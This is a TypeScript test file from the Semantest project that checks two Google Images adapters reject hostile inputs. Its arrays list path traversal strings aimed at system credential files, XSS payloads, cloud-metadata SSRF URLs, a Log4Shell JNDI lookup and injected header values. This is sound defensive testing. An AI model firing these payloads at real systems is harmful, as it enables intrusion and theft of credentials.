/*
                        Semantest - Infrastructure Security Tests
                        Adapter Security Validation

    This file is part of Semantest.

    Semantest is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
*/

import { GoogleImageDownloadAdapter } from '../../infrastructure/adapters/google-images-downloader.adapter';
import { GoogleImagesPlaywrightAdapter } from '../../infrastructure/adapters/google-images-playwright.adapter';

describe('Infrastructure Security Tests', () => {
    describe('Adapter Input Validation', () => {
        it('should validate and sanitize file paths', async () => {
            const adapter = new GoogleImageDownloadAdapter();
            
            const maliciousPaths = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '/etc/shadow',
                'C:\\Windows\\System32\\config\\SAM',
                'file://localhost/etc/passwd',
                '\\\\server\\share\\file.txt',
                'path/with/null\x00byte',
                'path/with/unicode\u202e\u064dpath',
                'path/with/spaces/../../../etc/passwd',
                'path/with/./../../etc/passwd'
            ];

            for (const maliciousPath of maliciousPaths) {
                try {
                    await adapter.downloadImage('https://example.com/test.jpg', maliciousPath);
                    // Should not reach here if validation works
                    fail(`Expected validation to reject malicious path: ${maliciousPath}`);
                } catch (error) {
                    expect(error).toBeInstanceOf(Error);
                    expect(error.message).toContain('Invalid filename');
                }
            }
        });

        it('should validate and sanitize URLs', async () => {
            const adapter = new GoogleImageDownloadAdapter();
            
            const maliciousUrls = [
                'javascript:alert("xss")',
                'data:text/html,<script>alert("xss")</script>',
                'vbscript:msgbox("xss")',
                'file:///etc/passwd',
                'ftp://malicious.com/evil.exe',
                'http://localhost:22/ssh-attack',
                'https://example.com:8080/../../etc/passwd',
                'http://169.254.169.254/latest/meta-data/', // AWS metadata
                'http://metadata.google.internal/computeMetadata/v1/', // GCP metadata
                'ldap://malicious.com/evil',
                'gopher://malicious.com/evil',
                'dict://malicious.com:11111/evil'
            ];

            for (const maliciousUrl of maliciousUrls) {
                try {
                    await adapter.downloadImage(maliciousUrl, 'test.jpg');
                    // Should not reach here if validation works
                    fail(`Expected validation to reject malicious URL: ${maliciousUrl}`);
                } catch (error) {
                    expect(error).toBeInstanceOf(Error);
                    expect(error.message).toContain('Invalid URL');
                }
            }
        });

        it('should validate configuration parameters', async () => {
            const adapter = new GoogleImageDownloadAdapter();
            
            const invalidConfigs = [
                { timeout: -1 },
                { timeout: 'invalid' },
                { maxFileSize: -1 },
                { maxFileSize: 'invalid' },
                { allowedMimeTypes: 'not-an-array' },
                { userAgent: null },
                { headers: 'not-an-object' },
                { followRedirects: 'not-a-boolean' },
                { maxRedirects: 'not-a-number' },
                { maxRedirects: -1 }
            ];

            for (const config of invalidConfigs) {
                expect(() => {
                    adapter.configure(config);
                }).toThrow('Invalid configuration');
            }
        });
    });

    describe('Playwright Adapter Security', () => {
        it('should validate browser configuration security', async () => {
            const adapter = new GoogleImagesPlaywrightAdapter();
            
            const dangerousConfigs = [
                { 
                    executablePath: '/bin/sh',
                    args: ['--disable-web-security', '--allow-running-insecure-content']
                },
                {
                    args: ['--disable-features=VizDisplayCompositor']
                },
                {
                    downloadsPath: '/etc'
                },
                {
                    userDataDir: '/tmp/../../../etc'
                }
            ];

            for (const config of dangerousConfigs) {
                expect(() => {
                    adapter.configure(config);
                }).toThrow('Unsafe configuration');
            }
        });

        it('should validate search query sanitization', async () => {
            const adapter = new GoogleImagesPlaywrightAdapter();
            
            const maliciousQueries = [
                '<script>alert("xss")</script>',
                'javascript:alert("xss")',
                'onload=alert("xss")',
                '"><script>alert("xss")</script>',
                'eval(String.fromCharCode(97,108,101,114,116,40,49,41))',
                '${jndi:ldap://malicious.com/evil}',
                '../../../../../../etc/passwd',
                'file:///etc/passwd',
                'data:text/html,<script>alert(1)</script>'
            ];

            for (const query of maliciousQueries) {
                try {
                    await adapter.searchImages(query, {});
                    // Should not reach here if validation works
                    fail(`Expected validation to reject malicious query: ${query}`);
                } catch (error) {
                    expect(error).toBeInstanceOf(Error);
                    expect(error.message).toContain('Invalid search query');
                }
            }
        });

        it('should enforce resource limits', async () => {
            const adapter = new GoogleImagesPlaywrightAdapter();
            
            const config = {
                timeout: 30000,
                maxPages: 5,
                maxResults: 100,
                userAgent: 'test-agent',
                viewport: { width: 1280, height: 720 }
            };
            
            adapter.configure(config);
            
            // Test that limits are enforced
            expect(adapter.getConfiguration().timeout).toBe(30000);
            expect(adapter.getConfiguration().maxPages).toBe(5);
            expect(adapter.getConfiguration().maxResults).toBe(100);
            
            // Test that excessive limits are rejected
            expect(() => {
                adapter.configure({ maxResults: 10000 });
            }).toThrow('Resource limit exceeded');
            
            expect(() => {
                adapter.configure({ timeout: 300000 }); // 5 minutes
            }).toThrow('Resource limit exceeded');
        });
    });

    describe('Network Security', () => {
        it('should validate network request security', async () => {
            const adapter = new GoogleImageDownloadAdapter();
            
            // Test that private IP ranges are blocked
            const privateIPs = [
                'http://10.0.0.1/test.jpg',
                'http://172.16.0.1/test.jpg',
                'http://192.168.1.1/test.jpg',
                'http://127.0.0.1/test.jpg',
                'http://localhost/test.jpg',
                'http://0.0.0.0/test.jpg'
            ];

            for (const ip of privateIPs) {
                try {
                    await adapter.downloadImage(ip, 'test.jpg');
                    fail(`Expected validation to reject private IP: ${ip}`);
                } catch (error) {
                    expect(error).toBeInstanceOf(Error);
                    expect(error.message).toContain('Private IP access blocked');
                }
            }
        });

        it('should validate HTTP header security', async () => {
            const adapter = new GoogleImageDownloadAdapter();
            
            const maliciousHeaders = [
                { 'X-Forwarded-For': '../../etc/passwd' },
                { 'User-Agent': '<script>alert("xss")</script>' },
                { 'Referer': 'javascript:alert("xss")' },
                { 'Cookie': 'sessionid=admin; path=/../../etc/passwd' },
                { 'Authorization': 'Bearer ../../etc/passwd' }
            ];

            for (const headers of maliciousHeaders) {
                expect(() => {
                    adapter.configure({ headers });
                }).toThrow('Invalid header value');
            }
        });

        it('should validate SSL/TLS requirements', async () => {
            const adapter = new GoogleImageDownloadAdapter();
            
            // Test that HTTP URLs are rejected in production mode
            const httpUrls = [
                'http://example.com/test.jpg',
                'http://insecure.com/image.png',
                'http://www.example.com/photo.gif'
            ];

            for (const url of httpUrls) {
                try {
                    await adapter.downloadImage(url, 'test.jpg');
                    fail(`Expected validation to reject HTTP URL: ${url}`);
                } catch (error) {
                    expect(error).toBeInstanceOf(Error);
                    expect(error.message).toContain('HTTPS required');
                }
            }
        });
    });

    describe('File System Security', () => {
        it('should validate file system access patterns', async () => {
            const adapter = new GoogleImageDownloadAdapter();
            
            const config = {
                downloadPath: '/tmp/semantest-test',
                maxFileSize: 10 * 1024 * 1024, // 10MB
                allowedMimeTypes: ['image/jpeg', 'image/png', 'image/gif'],
                createDirectories: true
            };
            
            adapter.configure(config);
            
            // Test that configuration is properly validated
            expect(adapter.getConfiguration().downloadPath).toBe('/tmp/semantest-test');
            expect(adapter.getConfiguration().maxFileSize).toBe(10 * 1024 * 1024);
            expect(adapter.getConfiguration().allowedMimeTypes).toEqual(['image/jpeg', 'image/png', 'image/gif']);
        });

        it('should prevent directory traversal attacks', async () => {
            const adapter = new GoogleImageDownloadAdapter();
            
            const traversalPaths = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '/etc/shadow',
                'C:\\Windows\\System32\\config\\SAM',
                'file://localhost/etc/passwd',
                '\\\\server\\share\\file.txt',
                'path/with/null\x00byte',
                'path/with/unicode\u202e\u064dpath'
            ];

            for (const path of traversalPaths) {
                try {
                    await adapter.downloadImage('https://example.com/test.jpg', path);
                    fail(`Expected validation to reject traversal path: ${path}`);
                } catch (error) {
                    expect(error).toBeInstanceOf(Error);
                    expect(error.message).toContain('Invalid filename');
                }
            }
        });

        it('should validate file permissions and ownership', async () => {
            const adapter = new GoogleImageDownloadAdapter();
            
            const config = {
                downloadPath: '/tmp/semantest-test',
                filePermissions: 0o644,
                directoryPermissions: 0o755,
                createDirectories: true
            };
            
            adapter.configure(config);
            
            // Test that permissions are properly set
            expect(adapter.getConfiguration().filePermissions).toBe(0o644);
            expect(adapter.getConfiguration().directoryPermissions).toBe(0o755);
        });
    });

    describe('Memory and Resource Security', () => {
        it('should prevent memory exhaustion attacks', async () => {
            const adapter = new GoogleImageDownloadAdapter();
            
            const config = {
                maxFileSize: 1024 * 1024, // 1MB limit
                maxConcurrentDownloads: 3,
                timeout: 30000
            };
            
            adapter.configure(config);
            
            // Test that memory limits are enforced
            expect(adapter.getConfiguration().maxFileSize).toBe(1024 * 1024);
            expect(adapter.getConfiguration().maxConcurrentDownloads).toBe(3);
            
            // Test that excessive limits are rejected
            expect(() => {
                adapter.configure({ maxFileSize: 1024 * 1024 * 1024 }); // 1GB
            }).toThrow('Resource limit exceeded');
        });

        it('should validate resource cleanup', async () => {
            const adapter = new GoogleImageDownloadAdapter();
            
            const config = {
                cleanupOnError: true,
                maxRetries: 3,
                retryDelay: 1000
            };
            
            adapter.configure(config);
            
            // Test that cleanup configuration is properly set
            expect(adapter.getConfiguration().cleanupOnError).toBe(true);
            expect(adapter.getConfiguration().maxRetries).toBe(3);
            expect(adapter.getConfiguration().retryDelay).toBe(1000);
        });

        it('should validate concurrent operation limits', async () => {
            const adapter = new GoogleImageDownloadAdapter();
            
            const config = {
                maxConcurrentDownloads: 5,
                queueSize: 50,
                timeout: 30000
            };
            
            adapter.configure(config);
            
            // Test that concurrency limits are enforced
            expect(adapter.getConfiguration().maxConcurrentDownloads).toBe(5);
            expect(adapter.getConfiguration().queueSize).toBe(50);
            
            // Test that excessive limits are rejected
            expect(() => {
                adapter.configure({ maxConcurrentDownloads: 100 });
            }).toThrow('Resource limit exceeded');
        });
    });

    describe('Error Handling Security', () => {
        it('should prevent information leakage through error messages', async () => {
            const adapter = new GoogleImageDownloadAdapter();
            
            try {
                await adapter.downloadImage('https://nonexistent.com/test.jpg', 'test.jpg');
                fail('Expected download to fail');
            } catch (error) {
                expect(error).toBeInstanceOf(Error);
                
                // Error messages should not contain sensitive information
                expect(error.message).not.toContain('internal');
                expect(error.message).not.toContain('system');
                expect(error.message).not.toContain('debug');
                expect(error.message).not.toContain('password');
                expect(error.message).not.toContain('token');
                expect(error.message).not.toContain('secret');
                expect(error.message).not.toContain('key');
            }
        });

        it('should validate error logging security', async () => {
            const adapter = new GoogleImageDownloadAdapter();
            
            const config = {
                logLevel: 'error',
                logSensitiveData: false,
                sanitizeErrorMessages: true
            };
            
            adapter.configure(config);
            
            // Test that logging configuration is secure
            expect(adapter.getConfiguration().logLevel).toBe('error');
            expect(adapter.getConfiguration().logSensitiveData).toBe(false);
            expect(adapter.getConfiguration().sanitizeErrorMessages).toBe(true);
        });

        it('should validate error recovery patterns', async () => {
            const adapter = new GoogleImageDownloadAdapter();
            
            const config = {
                maxRetries: 3,
                retryDelay: 1000,
                backoffFactor: 2,
                failOnError: true
            };
            
            adapter.configure(config);
            
            // Test that error recovery is properly configured
            expect(adapter.getConfiguration().maxRetries).toBe(3);
            expect(adapter.getConfiguration().retryDelay).toBe(1000);
            expect(adapter.getConfiguration().backoffFactor).toBe(2);
            expect(adapter.getConfiguration().failOnError).toBe(true);
        });
    });
});